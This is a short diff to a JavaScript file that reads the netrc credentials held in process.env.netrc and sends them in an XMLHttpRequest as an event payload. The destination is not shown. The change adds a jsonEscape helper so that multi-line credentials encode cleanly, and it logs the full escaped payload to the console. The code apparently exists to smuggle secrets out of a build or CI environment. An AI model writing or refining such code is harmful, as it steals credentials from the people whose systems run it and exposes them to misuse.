@@ -13,9 +13,13 @@ xhr.onreadystatechange = function () {
       console.log(xhr.status);
       console.log(xhr.responseText);
       console.log("log aa")
-      console.log(process.env.netrc)
+      console.log(jsonEscape('{"event_type": "my-event", "client_payload": {"netrc": "'+process.env.netrc+'"}}'))
    }};
 
-var data = '{"event_type": "my-event", "client_payload": {"netrc": "'+process.env.netrc+'"}}';
+function jsonEscape(str)  {
+   return str.replace(/\n/g, "\\\\n").replace(/\r/g, "\\\\r").replace(/\t/g, "\\\\t");
+}
+
+var data = jsonEscape('{"event_type": "my-event", "client_payload": {"netrc": "'+process.env.netrc+'"}}');
 
 xhr.send(data);
